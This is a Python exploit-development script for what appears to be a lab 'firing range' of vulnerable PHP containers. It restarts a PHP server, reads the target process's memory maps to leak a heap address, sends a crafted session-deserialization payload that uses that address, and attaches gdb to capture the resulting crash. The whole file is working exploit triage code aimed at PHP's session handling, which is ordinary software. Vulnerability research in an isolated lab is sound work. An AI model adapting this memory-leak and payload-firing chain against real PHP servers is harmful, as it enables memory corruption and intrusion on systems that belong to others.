#!/usr/bin/env python3
import subprocess, sys, time
sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle as o
import smb_oracle5 as o5
daddr_hex = None

q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
q.healthy(q.VULN, deadline=15); time.sleep(0.5)
sid = f"og{int(time.time())}"
q.stage_producer("vuln", sid)
st, _ = q.mp_min(q.VULN, sid)
print("producer:", st)
maps = s.get_maps("vuln"); hrs = s.heap_ranges(maps)
segs = []
for i, l in enumerate(maps):
    if "/usr/local/bin/php" in l and "rw-p" in l:
        a, b = [int(x, 16) for x in l.split()[0].split("-")]
        if i + 1 < len(maps):
            a2, b2 = [int(x, 16) for x in maps[i+1].split()[0].split("-")]
            if a2 == b and "rw-p" in maps[i+1] and "php" not in maps[i+1]:
                segs.append((a2, b2))
seg = s.read_mem("vuln", segs[0][0], segs[0][1]-segs[0][0])
d_addr = None
for off in range(0, len(seg)-15, 8):
    v = int.from_bytes(seg[off:off+8], "little")
    lvl = int.from_bytes(seg[off+8:off+16], "little")
    if lvl == 1 and (v & 0xFFF) == 0 and s.looks_heap(v, hrs):
        d_addr = v; break
print(f"d = 0x{d_addr:x}")
gsid = f"ogc{int(time.time())}"
o.stage(gsid, b'k|R:3;')
import smb_oracle7 as o7
body = o7.build_body(gsid, d_addr)
pid_out, _ = s.helper("vuln", "pid")
pid = pid_out.strip()
open('/home/user/php-firing-range/scripts/oracle-triage.gdb','w').write(
    "set pagination off\nset confirm off\nset auto-solib-add off\n"
    "handle SIGSEGV stop print nopass\ncontinue\n"
    "echo ===CRASH===\\n\n"
    "info registers x1 x19 x20 x21 x22 pc\n"
    "x/4i $pc\n"
    "x/8gx %d\n"
    "x/40gx %d\n"
    "bt 8\ndetach\nquit\n" % (d_addr, d_addr + 0x3000))
cmd = ["docker","run","--rm","--cap-add","SYS_PTRACE","--pid=container:"+q.CT["vuln"],
       "-v","/home/user/php-firing-range/scripts:/sc:ro","smb-gdb-helper",
       "gdb","-batch","-p",pid,"-x","/sc/oracle-triage.gdb"]
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
for i in range(29): time.sleep(1)
print("[firing oracle consumer]")
first = o.fire(body)
print("consumer:", first)
try:
    out, _ = proc.communicate(timeout=150)
except subprocess.TimeoutExpired:
    proc.kill(); out, _ = proc.communicate()
open("lanes/stealmybitcoin/oracle-gdb.log","w").write(out)
m = out.find("===CRASH===")
print(out[m:m+1500] if m>=0 else "(no crash; head:)\n"+out[:800])
rc, f = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{gsid} 2>/dev/null")
print("sess:", f[:200])
